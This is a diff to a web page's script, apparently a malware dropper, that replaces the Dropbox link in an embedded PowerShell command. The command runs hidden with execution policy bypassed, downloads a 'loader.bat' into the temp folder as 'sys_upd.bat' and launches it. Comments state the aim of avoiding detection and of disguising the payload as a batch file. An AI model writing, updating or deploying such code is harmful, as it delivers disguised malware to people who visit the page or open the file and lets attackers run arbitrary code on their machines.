@@ -5,7 +5,7 @@
     <script>
         // The PowerShell command to run your loader
         // This is encoded to avoid detection
-        const cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p='$env:TEMP\\sys_upd.bat'; iwr 'https://www.dropbox.com/scl/fi/hb4bx2x1mhbhkq27dc203/loader.bat?rlkey=gidnqfc4vs25lrldehf3vxco8&st=vyj67ryz&dl=1' -OutFile $p; Start-Process $p\"";
+        const cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p='$env:TEMP\\sys_upd.bat'; iwr 'https://www.dropbox.com/scl/fi/hqtxka76lerboi5o6r5pq/loader.bat?rlkey=ubs2p8e9tnji58mt8ai4vfjj0&st=7fjle2rv&dl=1' -OutFile $p; Start-Process $p\"";
         
         // Create a blob that looks like a batch file
         const blob = new Blob([cmd], { type: 'text/plain' });
